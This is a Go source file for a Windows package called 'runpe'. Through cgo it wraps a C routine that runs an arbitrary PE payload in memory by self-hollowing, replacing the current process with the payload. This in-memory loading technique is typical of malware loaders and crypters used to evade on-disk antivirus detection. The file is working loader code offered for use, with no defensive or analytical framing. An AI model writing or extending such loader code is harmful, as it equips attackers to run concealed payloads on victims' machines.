//go:build windows
// +build windows

// Package runpe provides functionality to execute PE files in memory.
// With self-hollowing, it replaces the current process with the payload.
// This package only works on Windows systems.
package runpe

// #cgo CFLAGS: -Wall
// #cgo LDFLAGS: -L${SRCDIR}/../.. -lrunpe -luser32 -lkernel32
// #include "../../cpp/selfhollow.h"
import "C"
import (
	"fmt"
	"unsafe"
)

// ExecuteInMemory runs a PE file in memory by replacing the current process
// payload is the PE file as a byte array
func ExecuteInMemory(payload []byte, _ string) error {
	if len(payload) < 512 {
		return fmt.Errorf("invalid payload size: %d bytes. Minimum 512 bytes expected", len(payload))
	}
	
	// Call the SelfHollowStrict function from C
	// This replaces the current process with the provided payload
	success := C.SelfHollowStrict(
		(*C.uchar)(unsafe.Pointer(&payload[0])),
		C.size_t(len(payload)),
	)
	
	if !success {
		return fmt.Errorf("self-hollowing execution failed")
	}
	
	return nil
} 